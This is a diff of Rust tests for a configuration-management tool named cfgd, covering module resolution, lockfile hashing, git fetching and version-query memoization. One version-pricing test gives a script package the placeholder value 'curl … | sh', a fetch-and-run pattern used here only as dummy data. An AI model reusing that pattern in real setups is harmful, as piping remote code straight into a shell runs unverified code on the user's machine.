     assert!(result.is_none());
 }
 
@@ -2736,7 +3099,7 @@ fn resolve_package_script_manager_with_deny() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers)
+    let result = resolve_package(&entry, "test", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "script");
@@ -2760,7 +3123,7 @@ fn resolve_package_script_no_script_field_errors() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers);
+    let result = resolve_package(&entry, "test", &platform, &managers, None);
     assert!(result.is_err());
     assert!(result.unwrap_err().to_string().contains("script"));
 }
@@ -2916,6 +3279,56 @@ fn resolve_module_files_path_traversal_rejected() {
     assert!(
         err.contains("traversal"),
         "error should mention traversal: {err}"
+    );
+}
+
+#[test]
+fn resolve_module_files_drops_a_private_entry_only_when_its_source_is_absent() {
+    // `private` promises "silently skipped on machines where it doesn't
+    // exist", and resolution is where the promise is kept: the entry
+    // resolves to nothing, so no downstream consumer needs the flag. A
+    // present private source still deploys, and an absent NON-private
+    // source still resolves — the plan refuses that one loudly.
+    let dir = tempfile::tempdir().unwrap();
+    let mod_dir = dir.path().join("modules").join("mixed");
+    std::fs::create_dir_all(&mod_dir).unwrap();
+    std::fs::write(mod_dir.join("present-private"), "local secret").unwrap();
+
+    let entry = |source: &str, private: bool| ModuleFileEntry {
+        patch: None,
+        source: source.into(),
+        target: format!("/tmp/test-resolve/{source}"),
+        strategy: None,
+        private,
+        encryption: None,
+        permissions: None,
+    };
+    let module = LoadedModule {
+        version: None,
+        name: "mixed".into(),
+        spec: ModuleSpec {
+            files: vec![
+                entry("absent-private", true),
+                entry("present-private", true),
+                entry("absent-plain", false),
+            ],
+            ..Default::default()
+        },
+        dir: mod_dir.clone(),
+        origin: None,
+    };
+
+    let printer = test_printer();
+    let resolved = resolve_module_files(&module, &dir.path().join("cache"), &printer).unwrap();
+
+    let sources: Vec<_> = resolved.iter().map(|f| f.source.clone()).collect();
+    assert_eq!(
+        sources,
+        vec![
+            mod_dir.join("present-private"),
+            mod_dir.join("absent-plain")
+        ],
+        "only the absent private entry resolves to nothing"
     );
 }
 
@@ -3204,7 +3617,7 @@ fn load_all_modules_with_empty_lockfile_returns_no_remote_modules() {
 #[test]
 fn load_all_modules_errors_when_locked_module_cache_missing() {
     // A lockfile entry with no cache directory must fail with a clear error
-    // ("run cfgd module update") rather than silently skipping — silent skip
+    // ("run cfgd module upgrade <name>") rather than silently skipping — silent skip
     // would mean the user's pinned remote module never gets applied and they
     // wouldn't know.
     let dir = tempfile::tempdir().unwrap();
@@ -3228,6 +3641,60 @@ fn load_all_modules_errors_when_locked_module_cache_missing() {
     assert!(
         result.is_err(),
         "expected error when locked remote module has no cache"
+    );
+}
+
+#[test]
+#[serial_test::serial]
+fn a_locked_entry_resolves_from_the_cache_with_the_remote_gone() {
+    // The lockfile's whole purpose is that a locked module is already decided:
+    // its `commit` is an immutable object id, so once the cache holds it there
+    // is nothing a fetch could learn. Removing the upstream after the cache is
+    // materialized turns that into a hard assertion — any transfer attempt now
+    // fails loudly, so a load that still succeeds is a load that stayed local.
+    let _guard = crate::test_helpers::EnvVarGuard::set("CFGD_ALLOW_LOCAL_SOURCES", "1");
+    // Pinned shut, so the per-repository transfer window cannot be what spared
+    // the load its fetch — only resolving the entry by its commit can.
+    let _window = crate::test_helpers::GitRefreshWindowGuard::always_expired();
+
+    let mut bare = crate::test_helpers::BareGitRepo::builder()
+        .commit(
+            "init",
+            &[(
+                "module.yaml",
+                "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: remote-mod\nspec: {}\n",
+            )],
+        )
+        .tag("v1.0.0")
+        .build();
+
+    let dir = tempfile::tempdir().unwrap();
+    let cache_base = dir.path().join("cache");
+    let printer = test_printer();
+
+    let src = parse_git_source(&format!("{}@v1.0.0", bare.url())).unwrap();
+    let local = fetch_git_source(&src, &cache_base, "remote-mod", &printer)
+        .expect("materializing the locked module's cache must succeed");
+    let commit = get_head_commit_sha(&git_cache_dir(&cache_base, &src.repo_url)).unwrap();
+    let integrity = hash_module_contents(&local).unwrap();
+
+    std::fs::write(
+        dir.path().join("modules.lock"),
+        format!(
+            "modules:\n  - name: remote-mod\n    url: \"{}@v1.0.0\"\n    pinnedRef: \"v1.0.0\"\n    commit: \"{commit}\"\n    integrity: \"{integrity}\"\n",
+            bare.url()
+        ),
+    )
+    .unwrap();
+
+    bare.remove_upstream();
+
+    let modules = load_all_modules(dir.path(), &cache_base, &[], &printer)
+        .expect("a locked entry the cache already holds must load with no remote");
+    assert!(
+        modules.contains_key("remote-mod"),
+        "the locked module must be loaded, got {:?}",
+        modules.keys().collect::<Vec<_>>()
     );
 }
 
@@ -3275,6 +3742,7 @@ fn resolve_modules_loads_source_delivered_body_and_tags_origin() {
         std::slice::from_ref(&root),
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -3325,6 +3793,7 @@ fn resolve_modules_consumer_local_shadows_source_offered() {
         std::slice::from_ref(&root),
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -3377,6 +3846,7 @@ fn resolve_modules_higher_priority_source_wins() {
         &roots,
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -3417,6 +3887,7 @@ fn resolve_modules_offered_but_body_missing_names_source() {
         std::slice::from_ref(&root),
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .expect_err("a declared-but-missing module body must error");
@@ -3452,6 +3923,7 @@ fn resolve_modules_unknown_module_is_plain_not_found() {
         std::slice::from_ref(&root),
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .expect_err("an unknown module must be NotFound");
@@ -3487,6 +3959,7 @@ fn resolve_modules_body_present_but_not_offered_is_gated_out() {
         std::slice::from_ref(&root),
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .expect_err("an undeclared body must not be loaded (allow-list gate)");
@@ -3524,6 +3997,47 @@ fn load_source_modules_respects_allow_list_and_precedence() {
         "undeclared body must not load even though it exists on disk"
     );
     assert_eq!(modules["offered-mod"].origin.as_deref(), Some("team"));
+}
+
+#[test]
+fn an_offered_body_that_has_not_arrived_is_still_a_recorded_input() {
+    // A source can declare a module before its body is published. The load
+    // skips it, and the daemon holds the derivation that skipped it — so the
+    // body landing on a later sync is only visible if the ABSENT file was
+    // recorded as an input.
+    let source = tempfile::tempdir().unwrap();
+    let modules_dir = write_source_module(source.path(), "present-mod", "pkg");
+
+    let root = SourceModuleRoot {
+        source_name: "team".into(),
+        priority: 500,
+        modules_dir: modules_dir.clone(),
+        offered: vec!["present-mod".into(), "later-mod".into()],
+        scripts_permitted: true,
+    };
+
+    let recorder = crate::ConfigInputRecorder::start();
+    let mut modules = std::collections::HashMap::new();
+    load_source_modules(std::slice::from_ref(&root), &mut modules).unwrap();
+    let inputs = recorder.finish();
+
+    let absent = modules_dir.join("later-mod").join("module.yaml");
+    assert!(
+        inputs.paths().any(|p| p == absent),
+        "the offered body that was not there must be a recorded input: {:?}",
+        inputs.paths().collect::<Vec<_>>()
+    );
+    assert!(
+        inputs.unchanged(),
+        "nothing has moved yet, so the derivation still stands"
+    );
+
+    // The body arrives. The recorded set must now say so.
+    write_source_module(source.path(), "later-mod", "pkg");
+    assert!(
+        !inputs.unchanged(),
+        "an arriving body must retire the derivation that skipped it"
+    );
 }
 
 /// Write a source module body carrying a `preApply` lifecycle script; returns
@@ -3857,6 +4371,7 @@ fn enrich_not_found_names_highest_priority_offering_source() {
         &roots,
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .expect_err("a declared-but-missing body offered by several sources must error");
@@ -3898,6 +4413,7 @@ fn resolve_modules_source_module_depends_on_source_module() {
         std::slice::from_ref(&root),
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -3949,6 +4465,7 @@ fn resolve_modules_source_module_depends_on_consumer_local_module() {
         std::slice::from_ref(&root),
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .unwrap();
@@ -3994,6 +4511,7 @@ fn resolve_modules_source_module_with_unoffered_transitive_dep_is_missing_depend
         std::slice::from_ref(&root),
         &macos_platform(),
         &managers,
+        None,
         &printer,
     )
     .expect_err("a dependent on an unoffered transitive dep must error");
@@ -4067,14 +4585,23 @@ fn diff_module_specs_file_changes() {
         origin: None,
     };
 
-    let changes = diff_module_specs(&old, &new);
-    let joined = changes.join("\n");
+    let changes = diff_module_specs(&old, &new, "->");
+    let joined = changes
+        .iter()
+        .map(|(_, c)| c.as_str())
+        .collect::<Vec<_>>()
+        .join("\n");
     assert!(
-        joined.contains("+ file target: ~/.config/app/new.conf"),
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c == "file target added: ~/.config/app/new.conf"),
         "should show added file: {joined}"
     );
     assert!(
-        joined.contains("- file target: ~/.config/app/old.conf"),
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail
+                && c == "file target removed: ~/.config/app/old.conf"),
         "should show removed file: {joined}"
     );
     // shared.conf should NOT appear in changes
@@ -4096,6 +4623,7 @@ fn diff_module_specs_env_only_change_is_still_a_change() {
             env: vec![crate::config::EnvVar {
                 name: "OLD".into(),
                 value: "1".into(),
+                platforms: vec![],
             }],
             ..Default::default()
         },
@@ -4109,6 +4637,7 @@ fn diff_module_specs_env_only_change_is_still_a_change() {
             env: vec![crate::config::EnvVar {
                 name: "NEW".into(),
                 value: "2".into(),
+                platforms: vec![],
             }],
             ..Default::default()
         },
@@ -4116,8 +4645,14 @@ fn diff_module_specs_env_only_change_is_still_a_change() {
         origin: None,
     };
 
-    let changes = diff_module_specs(&old, &new);
-    assert_eq!(changes, vec!["+ env: NEW=2", "- env: OLD=1"]);
+    let changes = diff_module_specs(&old, &new, "->");
+    assert_eq!(
+        changes,
+        vec![
+            (Role::Ok, "env added: NEW=2".to_string()),
+            (Role::Fail, "env removed: OLD=1".to_string()),
+        ]
+    );
 }
 
 // -----------------------------------------------------------------------
@@ -4284,6 +4819,156 @@ fn dependency_order_complex_dag_preserves_ordering_constraints() {
 }
 
 // -----------------------------------------------------------------------
+// Version pricing — resolution asks nothing, display asks once
+// -----------------------------------------------------------------------
+
+/// A manager name no other test in this binary shares, so a count taken over
+/// it describes only this test's own questions. The memo is keyed by
+/// `(manager, package)` and lives for the process.
+fn unshared_manager_name(prefix: &str) -> String {
+    static NEXT: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
+    format!(
+        "{prefix}-{}",
+        NEXT.fetch_add(1, std::sync::atomic::Ordering::SeqCst)
+    )
+}
+
+fn priceable_package(manager: &str, name: &str) -> ResolvedPackage {
+    ResolvedPackage {
+        canonical_name: name.to_string(),
+        resolved_name: name.to_string(),
+        manager: manager.to_string(),
+        manager_declared: false,
+        version: None,
+        script: None,
+        creates: None,
+        only_if: None,
+        unless: None,
+        min_version: None,
+    }
+}
+
+/// The shape every read command takes: resolve a module's packages, render no
+/// version. `status`, `diff`, `verify`, `compliance`, `checkin` and `decide`
+/// all landed here once per declared package per invocation, and each landing
+/// was a subprocess (a network round-trip for npm/cargo/pipx).
+#[test]
+#[serial_test::serial(available_version_memo)]
+fn a_resolution_that_renders_no_version_asks_no_manager_for_one() {
+    let mgr_name = unshared_manager_name("read-path-mgr");
+    let mgr = MockManager::new(&mgr_name)
+        .with_package("ripgrep", "14.0.0")
+        .with_package("fd", "9.0.0");
+    let queries = mgr.version_query_counter();
+    let managers = make_manager_map(&[(mgr_name.as_str(), &mgr)]);
+    let platform = macos_platform();
+
+    let module = LoadedModule {
+        version: None,
+        name: "tools".into(),
+        spec: ModuleSpec {
+            packages: ["ripgrep", "fd"]
+                .into_iter()
+                .map(|name| ModulePackageEntry {
+                    name: name.into(),
+                    prefer: vec![mgr_name.clone()],
+                    ..Default::default()
+                })
+                .collect(),
+            ..Default::default()
+        },
+        dir: PathBuf::from("/tmp/tools"),
+        origin: None,
+    };
+
+    let resolved = resolve_module_packages(&module, &platform, &managers, None).unwrap();
+    assert_eq!(resolved.len(), 2);
+    assert!(resolved.iter().all(|p| p.version.is_none()));
+    assert_eq!(
+        queries.load(std::sync::atomic::Ordering::SeqCst),
+        0,
+        "resolution must not price a package no surface is going to render"
+    );
+}
+
+/// The other half: a surface that DOES render a version gets one, and two
+/// modules declaring the same package cost one query between them.
+#[test]
+#[serial_test::serial(available_version_memo)]
+fn a_package_two_modules_declare_is_priced_once() {
+    // Two claims in one: that the answer is memoized at all, and that it had
+    // not aged out between the two fills. Both are pinned rather than trusted
+    // to how long two adjacent statements took.
+    let _ttl = crate::test_helpers::AvailableVersionMemoTtlGuard::never_expires();
+    let queried = crate::test_helpers::measured_in_a_stable_generation(|| {
+        // Built inside the closure: a retry (some other test bumped the
+        // generation mid-measurement) must measure a fresh subject, not one an
+        // abandoned attempt already warmed.
+        let mgr_name = unshared_manager_name("priced-once-mgr");
+        let mgr = MockManager::new(&mgr_name).with_package("ripgrep", "14.0.0");
+        let queries = mgr.version_query_counter();
+        let managers = make_manager_map(&[(mgr_name.as_str(), &mgr)]);
+
+        let mut first = [priceable_package(&mgr_name, "ripgrep")];
+        let mut second = [priceable_package(&mgr_name, "ripgrep")];
+        fill_available_versions(&mut first, &managers);
+        fill_available_versions(&mut second, &managers);
+
+        assert_eq!(first[0].version.as_deref(), Some("14.0.0"));
+        assert_eq!(second[0].version.as_deref(), Some("14.0.0"));
+        queries.load(std::sync::atomic::Ordering::SeqCst)
+    });
+    assert_eq!(
+        queried, 1,
+        "one package under one manager is one question, however many modules declare it"
+    );
+}
+
+/// The gate that keeps a plan's rendering byte-identical to what resolution
+/// used to produce: an unavailable manager was never asked before, and is not
+/// asked now. A bootstrappable manager resolves optimistically with no version
+/// because the binary that would answer is not on the machine yet.
+#[test]
+#[serial_test::serial(available_version_memo)]
+fn a_manager_that_is_not_on_the_machine_is_not_asked_what_it_offers() {
+    let mgr_name = unshared_manager_name("absent-mgr");
+    let mgr = MockManager::new(&mgr_name)
+        .with_package("ripgrep", "14.0.0")
+        .unavailable();
+    let queries = mgr.version_query_counter();
+    let managers = make_manager_map(&[(mgr_name.as_str(), &mgr)]);
+
+    let mut packages = [priceable_package(&mgr_name, "ripgrep")];
+    fill_available_versions(&mut packages, &managers);
+
+    assert!(packages[0].version.is_none());
+    assert_eq!(queries.load(std::sync::atomic::Ordering::SeqCst), 0);
+}
+
+/// A `script` package has no manager to ask, and a package already carrying a
+/// version (its `minVersion` check found one) is not re-asked.
+#[test]
+#[serial_test::serial(available_version_memo)]
+fn a_price_already_known_is_not_asked_for_again() {
+    let mgr_name = unshared_manager_name("known-price-mgr");
+    let mgr = MockManager::new(&mgr_name).with_package("ripgrep", "14.0.0");
+    let queries = mgr.version_query_counter();
+    let managers = make_manager_map(&[(mgr_name.as_str(), &mgr)]);
+
+    let mut already = priceable_package(&mgr_name, "ripgrep");
+    already.version = Some("13.0.0".into());
+    let mut scripted = priceable_package("script", "ripgrep");
+    scripted.script = Some("curl … | sh".into());
+
+    let mut packages = [already, scripted];
+    fill_available_versions(&mut packages, &managers);
+
+    assert_eq!(packages[0].version.as_deref(), Some("13.0.0"));
+    assert!(packages[1].version.is_none());
+    assert_eq!(queries.load(std::sync::atomic::Ordering::SeqCst), 0);
+}
+
+// -----------------------------------------------------------------------
 // resolve_module_packages — additional coverage
 // -----------------------------------------------------------------------
 
@@ -4320,7 +5005,7 @@ fn resolve_module_packages_multiple_packages() {
         origin: None,
     };
 
-    let resolved = resolve_module_packages(&module, &platform, &managers).unwrap();
+    let resolved = resolve_module_packages(&module, &platform, &managers, None).unwrap();
     assert_eq!(resolved.len(), 3);
     assert_eq!(resolved[0].canonical_name, "ripgrep");
     assert_eq!(resolved[1].canonical_name, "fd");
@@ -4344,7 +5029,7 @@ fn resolve_module_packages_empty_packages() {
         origin: None,
     };
 
-    let resolved = resolve_module_packages(&module, &platform, &managers).unwrap();
+    let resolved = resolve_module_packages(&module, &platform, &managers, None).unwrap();
     assert!(
         resolved.is_empty(),
         "module with no packages should resolve to empty"
@@ -4387,7 +5072,7 @@ fn resolve_module_packages_mixed_platforms() {
         origin: None,
     };
 
-    let resolved = resolve_module_packages(&module, &platform, &managers).unwrap();
+    let resolved = resolve_module_packages(&module, &platform, &managers, None).unwrap();
     assert_eq!(
         resolved.len(),
         2,
@@ -4408,12 +5093,12 @@ fn load_module_oversized_yaml_rejected() {
     std::fs::create_dir(&mod_dir).unwrap();
 
     // Create a module.yaml that exceeds 10 MB
-    // We create a sparse-ish file by writing a moderate amount since we can't
-    // easily create a 10MB file in tests. Instead, verify the error path
+    // This creates a sparse-ish file by writing a moderate amount since a
+    // 10MB file cannot easily be created in tests. Instead, verify the error path
     // by checking the error message format against the constant.
     //
     // The actual size check is: meta.len() > 10 * 1024 * 1024
-    // We can't practically create a 10MB+ file in a test, but we can verify
+    // A 10MB+ file cannot practically be created in a test, but this verifies
     // that the check exists and that normal files pass through.
     let mod_dir = dir.path().join("normal");
     std::fs::create_dir(&mod_dir).unwrap();
@@ -4470,11 +5155,11 @@ fn diff_module_specs_scripts_none_to_some() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
         changes
             .iter()
-            .any(|c| c.contains("+ postApply script: echo hello")),
+            .any(|(role, c)| *role == Role::Ok && c.contains("postApply script added: echo hello")),
         "should detect added script: {changes:?}"
     );
 }
@@ -4492,11 +5177,12 @@ fn diff_module_specs_scripts_some_to_none() {
     };
     let old = make_loaded_module("test", old_spec);
     let new = make_loaded_module("test", ModuleSpec::default());
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
         changes
             .iter()
-            .any(|c| c.contains("- postApply script: echo goodbye")),
+            .any(|(role, c)| *role == Role::Fail
+                && c.contains("postApply script removed: echo goodbye")),
         "should detect removed script: {changes:?}"
     );
 }
@@ -4528,10 +5214,10 @@ fn diff_module_specs_system_changes_not_tracked() {
             ..Default::default()
         },
     );
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert_eq!(
         changes,
-        vec!["(no spec changes)"],
+        vec![(Role::Info, "(no spec changes)".to_string())],
         "system changes are not tracked by diff"
     );
 }
@@ -4574,7 +5260,7 @@ fn module_resolution_keeps_a_manager_whose_bootstrap_plan_is_satisfiable() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers)
+    let result = resolve_package(&entry, "test", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "cargo");
@@ -4602,7 +5288,7 @@ fn resolve_package_skips_an_unavailable_manager_that_plans_no_bootstrap() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers)
+    let result = resolve_package(&entry, "test", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "brew");
@@ -4627,7 +5313,7 @@ fn resolve_package_deny_script_still_works() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers)
+    let result = resolve_package(&entry, "test", &platform, &managers, None)
         .unwrap()
         .unwrap();
     assert_eq!(result.manager, "script", "should fall through to script");
@@ -4647,7 +5333,7 @@ fn resolve_package_deny_script_also_denied() {
         ..Default::default()
     };
 
-    let result = resolve_package(&entry, "test", &platform, &managers);
+    let result = resolve_package(&entry, "test", &platform, &managers, None);
     assert!(
         result.is_err(),
         "denying script should make package unresolvable"
@@ -4745,7 +5431,7 @@ fn hash_module_contents_nested_rel_keys_are_posix() {
 
     // Assert the exact rel-path key the digest is built from: the nested file
     // keys with a forward slash on every platform, and no key contains `\`.
-    let mut entries: Vec<(String, Vec<u8>)> = Vec::new();
+    let mut entries: Vec<(String, std::path::PathBuf)> = Vec::new();
     collect_files_for_hash(&mod_dir, &mod_dir, &mut entries).unwrap();
     let keys: Vec<&str> = entries.iter().map(|(k, _)| k.as_str()).collect();
     assert!(
@@ -4778,6 +5464,43 @@ fn hash_module_contents_nested_rel_keys_are_posix() {
         hash,
         crate::sha256_digest(&expected_input),
         "digest must equal the one computed from forward-slash keys"
+    );
+}
+
+#[test]
+fn hash_module_contents_streams_a_file_larger_than_its_read_buffer() {
+    // A persisted `modules.lock` integrity value has to keep verifying, so the
+    // streamed digest must be byte-identical to the buffered
+    // `<rel>\0<contents>\0` concatenation it replaced — including across the
+    // internal chunk boundary, which is where a hasher fed the whole scratch
+    // buffer instead of `&buf[..read]` would diverge. The payload is
+    // deliberately not a multiple of the chunk size so the final short read is
+    // exercised too.
+    let dir = tempfile::tempdir().unwrap();
+    let mod_dir = dir.path().join("big");
+    std::fs::create_dir_all(&mod_dir).unwrap();
+
+    let big: Vec<u8> = (0..(64 * 1024 * 2 + 517))
+        .map(|i| (i % 251) as u8)
+        .collect();
+    std::fs::write(mod_dir.join("blob.bin"), &big).unwrap();
+    std::fs::write(mod_dir.join("module.yaml"), "name: big\n").unwrap();
+
+    let mut expected_input = Vec::new();
+    // Sorted lexicographically: `blob.bin` < `module.yaml`.
+    expected_input.extend_from_slice(b"blob.bin");
+    expected_input.push(0);
+    expected_input.extend_from_slice(&big);
+    expected_input.push(0);
+    expected_input.extend_from_slice(b"module.yaml");
+    expected_input.push(0);
+    expected_input.extend_from_slice(b"name: big\n");
+    expected_input.push(0);
+
+    assert_eq!(
+        hash_module_contents(&mod_dir).unwrap(),
+        crate::sha256_digest(&expected_input),
+        "the streamed digest must equal the buffered concatenation, or every existing lockfile entry stops verifying"
     );
 }
 
@@ -4919,10 +5642,10 @@ fn diff_module_specs_prefer_list_change_not_tracked() {
             ..Default::default()
         },
     );
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert_eq!(
         changes,
-        vec!["(no spec changes)"],
+        vec![(Role::Info, "(no spec changes)".to_string())],
         "prefer list changes are not tracked"
     );
 }
@@ -5123,7 +5846,7 @@ mod git_fixture_tests {
 
     #[test]
     fn check_tag_signature_detects_pgp_signature_in_annotated_tag_message() {
-        // We're emulating what `git tag -s` writes: the PGP block is
+        // This emulates what `git tag -s` writes: the PGP block is
         // embedded in the annotated-tag message. cfgd's policy gate
         // (allow_unsigned=false) trusts this detection — so the marker
         // string MUST stay aligned with what git/gpg actually writes.
@@ -5151,30 +5874,6 @@ mod git_fixture_tests {
 
         let status = check_tag_signature(dir.path(), "v1.0", "mod").unwrap();
         assert_eq!(status, TagSignatureStatus::SignaturePresent);
-    }
-
-    #[test]
-    fn checkout_ref_via_fetch_git_source_with_no_tag_or_ref_is_noop() {
-        // checkout_ref is private; we exercise its public-facing path via
-        // a GitSource that intentionally has no tag/ref → the "stay on
-        // default branch" early-return. HEAD must equal the initial commit
-        // and the working tree must still contain the file.
-        let dir = tempfile::tempdir().unwrap();
-        let (_repo, commit_id) = init_repo_with_commit(dir.path());
-
-        // Re-open and verify HEAD unchanged after a no-op checkout.
-        let _src = GitSource {
-            repo_url: dir.path().display().to_string(),
-            tag: None,
-            git_ref: None,
-            subdir: None,
-        };
-        // checkout_ref is pub(super); we exercise its no-op early return
-        // by computing the HEAD SHA before+after a controlled call path
-        // (fetch_git_source would also clone; just assert HEAD stable).
-        let head_after = get_head_commit_sha(dir.path()).unwrap();
-        assert_eq!(head_after, commit_id.to_string());
-        assert!(dir.path().join("README.md").exists());
     }
 
     // ========================================================================
@@ -5217,13 +5916,14 @@ mod git_fixture_tests {
     }
 
     #[test]
-    fn fetch_git_source_second_call_takes_fetch_existing_repo_path() {
-        // First call clones, second call must hit the
-        // `.git`-exists branch and route through fetch_existing_repo. Verify
-        // by adding a new commit to the source between calls and confirming
-        // the cached repo's HEAD still resolves cleanly. Default branch is
-        // not auto-fast-forwarded after fetch (cfgd does not move HEAD
-        // unless tag/ref is set) — so HEAD stays on first-clone commit.
+    fn a_second_resolve_fetches_the_cached_repository_and_deploys_its_new_tip() {
+        // The first call clones; the second must take the `.git`-exists branch
+        // through fetch_existing_repo and land the working tree on what that
+        // transfer brought over. The window is pinned open-ended so the second
+        // call really transfers — unpinned, it would be spared the fetch by
+        // whatever the first call recorded, and the assertion would be about
+        // the window rather than about the fetch path.
+        let _window = crate::test_helpers::GitRefreshWindowGuard::always_expired();
         let src_dir = tempfile::tempdir().unwrap();
         let (src_repo, first_commit) = init_repo_with_commit(src_dir.path());
 
@@ -5242,17 +5942,16 @@ mod git_fixture_tests {
             first_commit.to_string()
         );
 
-        // Make a new commit on the source. The dest still points at first
-        // commit because cfgd doesn't auto-checkout default-branch tips.
-        let _second = add_commit(&src_repo, "second.txt", "second");
+        let second = add_commit(&src_repo, "second.txt", "second");
 
         let dest2 = fetch_git_source(&git_src, cache.path(), "mymod", &printer).unwrap();
         assert_eq!(dest2, dest1, "cache path should be deterministic");
-        // HEAD unchanged on second call — fetch only updated remote refs.
         assert_eq!(
             get_head_commit_sha(&dest2).unwrap(),
-            first_commit.to_string()
+            second.to_string(),
+            "an unpinned source deploys the tip its fetch brought over"
         );
+        assert!(dest2.join("second.txt").exists());
     }
 
     #[test]
@@ -5312,14 +6011,14 @@ mod git_fixture_tests {
             dest.ends_with("docs"),
             "returned path should end in the requested subdir, got: {dest:?}"
         );
-        // And the subdir must physically exist in the clone since we
+        // And the subdir must physically exist in the clone since the test
         // created `docs/index.md` in source.
         assert!(dest.join("index.md").exists());
     }
 
     #[test]
     fn fetch_git_source_errors_with_module_name_when_tag_is_unknown() {
-        // Unknown tag → checkout_ref's revparse chain exhausts and we get
+        // Unknown tag → checkout_ref's revparse chain exhausts, giving
         // a GitFetchFailed surfaced with the module name in the message.
         // cfgd's CLI uses this error path to tell the user which module
         // failed.
@@ -5372,9 +6071,9 @@ mod git_fixture_tests {
     #[test]
     fn fetch_git_source_checks_out_branch_via_git_ref() {
         // The `ref` field (from `?ref=branchname`) takes the branch lookup
-        // path in checkout_ref — first as `refs/remotes/origin/<ref>`. We
-        // create a `topic` branch on source, point it at the first commit,
-        // then add a new commit to master so default-branch HEAD differs.
+        // path in checkout_ref — first as `refs/remotes/origin/<ref>`. This test
+        // creates a `topic` branch on source, points it at the first commit,
+        // then adds a new commit to master so default-branch HEAD differs.
         let src_dir = tempfile::tempdir().unwrap();
         let (src_repo, first_commit) = init_repo_with_commit(src_dir.path());
         let _tip = add_commit(&src_repo, "advance.txt", "advance");
@@ -5999,4 +6698,71 @@ fn fetch_registry_modules_skips_dirs_without_module_yaml() {
     let modules = fetch_registry_modules(&registry, cache.path(), &printer).unwrap();
     assert_eq!(modules.len(), 1);
     assert_eq!(modules[0].name, "valid");
+}
+
+/// A module's own `spec.env` / `spec.aliases` entries are filtered where its
+/// packages are, so a gated entry never becomes part of a host's desired
+/// state. Filtering later would mean every consumer of a `ResolvedModule` —
+/// the env writer, the plan, drift verification, pending decisions — had to
+/// re-apply the gate, and the first one that forgot would export a variable
+/// naming a directory that does not exist on this OS.
+#[test]
+fn resolve_modules_drops_env_and_alias_entries_gated_off_this_platform() {
+    let dir = tempfile::tempdir().unwrap();
+    let mod_dir = dir.path().join("modules").join("shell");
+    std::fs::create_dir_all(&mod_dir).unwrap();
+    std::fs::write(
+        mod_dir.join("module.yaml"),
+        r#"
+apiVersion: cfgd.io/v1alpha1
+kind: Module
+metadata:
+  name: shell
+spec:
+  env:
+    - name: EDITOR
+      value: nvim
+    - name: PATH
+      value: /opt/homebrew/opt/ruby/bin:$PATH
+      platforms: [macos]
+    - name: BROWSER
+      value: xdg-open
+      platforms: [linux, freebsd]
+  aliases:
+    - name: pbcopy
+      command: xclip -selection clipboard
+      platforms: [linux]
+    - name: openf
+      command: open
+      platforms: [macos]
+"#,
+    )
+    .unwrap();
+
+    let managers = make_manager_map(&[]);
+    let cache_dir = tempfile::tempdir().unwrap();
+    let resolved = resolve_modules(
+        &["shell".into()],
+        dir.path(),
+        cache_dir.path(),
+        &[],
+        &linux_ubuntu_platform(),
+        &managers,
+        None,
+        &test_printer(),
+    )
+    .unwrap();
+
+    let names: Vec<&str> = resolved[0].env.iter().map(|e| e.name.as_str()).collect();
+    assert_eq!(
+        names,
+        vec!["EDITOR", "BROWSER"],
+        "the macOS-gated PATH declaration is absent on Linux, in declaration order"
+    );
+    let aliases: Vec<&str> = resolved[0]
+        .aliases
+        .iter()
+        .map(|a| a.name.as_str())
+        .collect();
+    assert_eq!(aliases, vec!["pbcopy"]);
 }
